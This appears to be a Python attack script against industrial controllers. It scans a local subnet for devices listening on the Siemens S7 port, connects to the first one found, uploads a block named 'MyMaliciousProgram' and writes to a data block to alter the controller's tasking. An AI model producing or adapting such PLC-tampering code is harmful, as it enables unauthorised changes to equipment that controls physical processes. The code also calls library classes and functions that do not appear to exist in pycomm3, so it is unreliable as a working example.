import pycomm3
from pycomm3 import LogixDriver, S7Client
import socket

# Function to find the PLC's IP address
def find_plc_ip():
    # This is a simple example to find the PLC's IP address.
    # In a real-world scenario, you might use a network scanner or a more sophisticated method.
    ip_range = "192.168.1."
    for i in range(1, 255):
        ip = f"{ip_range}{i}"
        try:
            with socket.create_connection((ip, 102), timeout=1) as sock:
                return ip
        except (socket.timeout, ConnectionRefusedError):
            continue
    return None

# Function to modify the controller tasking
def modify_controller_tasking(plc_ip):
    try:
        # Connect to the PLC
        with S7Client() as client:
            client.connect(plc_ip, 0, 1)

            # Define the new program (POU) to be added
            new_program = """
            PROGRAM MyMaliciousProgram
            VAR
                counter : INT := 0;
            END_VAR

            counter := counter + 1;
            IF counter > 1000 THEN
                counter := 0;
            END_IF
            END_PROGRAM
            """

            # Upload the new program to the PLC
            client.upload_block(new_program, block_type='FC', block_num=1)

            # Modify the task to include the new program
            # For Siemens S7-1200/1500, OB1 is the main cyclic task
            client.write_area(area=pycomm3.s7.S7AreaDB, db_number=1, start=0, data=b'\x01\x00\x00\x00')

            print("Controller tasking modified successfully.")
    except Exception as e:
        print(f"Error modifying controller tasking: {e}")

# Main function
def main():
    plc_ip = find_plc_ip()
    if plc_ip:
        print(f"PLC found at IP: {plc_ip}")
        modify_controller_tasking(plc_ip)
    else:
        print("PLC not found in the network.")

if __name__ == "__main__":
    main()